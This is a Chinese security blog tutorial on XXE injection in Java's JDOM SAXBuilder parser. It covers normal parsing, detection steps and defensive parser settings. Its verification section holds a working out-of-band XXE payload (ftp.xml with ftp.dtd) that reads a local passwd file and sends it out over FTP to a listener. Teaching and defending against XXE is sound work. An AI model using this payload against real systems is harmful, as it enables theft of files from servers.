# XML注入之SAXBuilder

2019-05-26 / [Java](https://www.mi1k7ea.com/tags/Java/)[Web安全](https://www.mi1k7ea.com/tags/Web安全/)[XML注入](https://www.mi1k7ea.com/tags/XML注入/)

## 0x01 何为SAXBuilder

SAXBuilder是一个JDOM解析器，能将路径中的XML文件解析为Document对象。

SAXBuilder使用第三方SAX解析器（默认情况下由JAXP选择，或者您可以手动配置）来处理解析任务，并使用SAXHandler的实例来侦听SAX事件，以便使用JDOM内容构造文档一个JDOMFactory。

## 0x02 常规用法Demo

需要下载org.jdom的jar包：http://www.jdom.org/dist/binary/jdom-2.0.6.zip

先定义一个user.xml，用于让DocumentBuilder来解析：

```
<?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>Mi1k7ea</name>
    <sex>male</sex>
    <age>20</age>
</user>
```

Demo代码：

```
public class test {
    public static void main(String[] args) throws Exception{
        File f = new File("user.xml");
        saxBuilder(f);
    }

    public static void saxBuilder(File f){
        try {
            SAXBuilder saxBuilder = new SAXBuilder();
            org.jdom2.Document d = saxBuilder.build(f);
            Element root = d.getRootElement();
            List<Element> childs = root.getChildren();
            for (Element child : childs){
                String name = child.getName();
                String text = child.getText();
                System.out.println(name + ":" + text);
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

运行后，发现成功解析了user.xml的内容：

![img](https://www.mi1k7ea.com/2019/05/26/XML%E6%B3%A8%E5%85%A5%E4%B9%8BSAXBuilder/1.png)

## 0x03 XML注入漏洞验证

具体的步骤参考之前的博客[《XML注入之DocumentBuilder与XXE攻击防御》](https://www.mi1k7ea.com/2019/02/13/XML注入之DocumentBuilder/)，这里不再赘述。

下面只进行无回显外带OOB攻击Demo：

```
public class test {
    public static void main(String[] args) throws Exception{
        File f = new File("user.xml");
        saxBuilder(f);
    }

    public static void saxBuilder(File f){
        try {
            SAXBuilder saxBuilder = new SAXBuilder();
            org.jdom2.Document d = saxBuilder.build(f);
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

ftp.xml

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
        <!ENTITY % file SYSTEM "file:///e:/passwd">
        <!ENTITY % remote SYSTEM "http://127.0.0.1/xxe/ftp.dtd">
        %remote;
        %all;
        ]>
<root>&send;</root>
```

ftp.dtd

```
<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://127.0.0.1:21/%file;'>">
```

运行本地FTPServer接收数据：

![img](https://www.mi1k7ea.com/2019/05/26/XML%E6%B3%A8%E5%85%A5%E4%B9%8BSAXBuilder/2.png)

## 0x04 检测方法

1、在Java项目中搜索org.jdom下的SAXBuilder，排查是否使用了该API解析XML文档内容；

2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能；

3、除了setFeature()的设置外，检查Reader在read()解析xml数据之前是否采用setEntityResolver()的方式来设置自定义实体解析方式；

## 0x05 防御方法

```
saxBuilder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
saxBuilder.setFeature("http://xml.org/sax/features/external-general-entities", false);
saxBuilder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
saxBuilder.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```